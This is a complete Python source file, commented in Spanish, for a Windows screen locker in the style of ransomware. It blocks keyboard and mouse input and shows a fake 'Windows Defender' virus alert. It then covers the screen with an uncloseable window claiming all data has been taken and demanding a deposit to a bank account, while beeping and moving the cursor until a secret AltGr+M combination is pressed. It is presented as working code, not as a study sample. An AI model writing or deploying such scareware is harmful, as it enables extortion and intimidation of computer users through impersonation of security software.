import ctypes
import os
import time
import winsound
import pyautogui
import threading
import tkinter as tk
import keyboard  # Para bloquear teclas

# Variable global para la ventana
root = None

# Función para bloquear el teclado (excepto AltGr + M)
def bloquear_teclado():
    for i in range(150):  # Bloqueamos todas las teclas excepto AltGr y M
        if i not in (56, 50):  # 56 = AltGr, 50 = M
            keyboard.block_key(i)

# Función para desbloquear el teclado y mouse
def desbloquear():
    print("¡Combinación detectada! Cerrando la aplicación...")
    keyboard.unhook_all()  # Desbloquea el teclado
    ctypes.windll.user32.BlockInput(False)  # Desbloquea el mouse
    if root:
        root.destroy()
    os._exit(0)  # Cierra el programa inmediatamente

# Función para detectar AltGr + M
def detectar_salida(e):
    if keyboard.is_pressed("alt gr") and keyboard.is_pressed("m"):
        desbloquear()

# Función para bloquear teclado y mouse
def bloquear_input():
    ctypes.windll.user32.BlockInput(True)

# Función para hacer que el usuario no pueda cerrar la ventana
def pantalla_completa():
    global root
    root = tk.Tk()
    root.attributes('-fullscreen', True)  # Pantalla completa
    root.config(bg="black")  # Fondo negro
    root.attributes('-topmost', True)  # Siempre encima
    root.overrideredirect(True)  # Sin botones de cerrar

    label = tk.Label(root, text="⚠️ ALERTA ⚠️\nTu PC ha sido bloqueada\nTenemos todos tus datos\nDeposita a esta cuenta de banco:\nCR18282839292",
                     fg="red", bg="black", font=("Arial", 24, "bold"))
    label.pack(expand=True)

    root.mainloop()

# Función para reproducir un sonido de alerta
def sonido_alerta():
    while True:
        winsound.Beep(1000, 500)  # Beep de advertencia
        time.sleep(1)

# Función para mover el mouse aleatoriamente
def mover_mouse():
    while True:
        x, y = pyautogui.position()
        pyautogui.moveTo(x + 10, y + 10)
        time.sleep(0.5)

# Bloquear el teclado completamente
bloquear_teclado()

# Detectar la combinación de teclas AltGr + M
keyboard.on_press(detectar_salida)

# Mostrar un mensaje de Windows falso
ctypes.windll.user32.MessageBoxW(0, "Se ha detectado un virus en tu sistema.\nWindows no es capaz de lidiar con el problema.", "Windows Defender", 0x10)

# Bloquear teclado y mouse
threading.Thread(target=bloquear_input, daemon=True).start()

# Hacer que el mouse se mueva aleatoriamente
threading.Thread(target=mover_mouse, daemon=True).start()

# Reproducir un sonido de alerta en bucle
threading.Thread(target=sonido_alerta, daemon=True).start()

# Iniciar ventana de pantalla completa
pantalla_completa()
